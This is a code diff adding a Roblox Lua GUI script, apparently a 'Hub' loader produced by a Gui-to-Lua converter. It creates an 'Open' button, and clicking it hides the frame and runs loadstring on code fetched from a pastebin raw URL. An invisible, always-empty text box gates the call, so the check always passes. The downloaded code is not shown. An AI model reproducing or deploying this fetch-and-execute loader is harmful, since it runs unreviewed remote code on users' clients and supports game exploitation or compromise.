@@ -1,0 +1,56 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Hub = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local UICorner_2 = Instance.new("UICorner")
+local TextBox = Instance.new("TextBox")
+local UIScale = Instance.new("UIScale")
+
+--Properties:
+
+Hub.Name = "Hub"
+Hub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+Hub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = Hub
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.Position = UDim2.new(0.466378778, 0, 0.538555682, 0)
+main.Size = UDim2.new(0, 170, 0, 71)
+
+TextButton.Parent = main
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Size = UDim2.new(0, 170, 0, 71)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Open"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+TextButton.MouseButton1Down:Connect(function()
+	if TextBox.Text == "" then
+		main.Visible = false
+		
+		loadstring(game:HttpGet('https://pastebin.com/raw/EXeeGcX3', true))()
+	end
+end)
+
+UICorner.Parent = TextButton
+
+UICorner_2.Parent = main
+
+TextBox.Parent = main
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.Size = UDim2.new(0, 200, 0, 50)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14.000
+
+UIScale.Parent = TextBox
+UIScale.Scale = 0.000
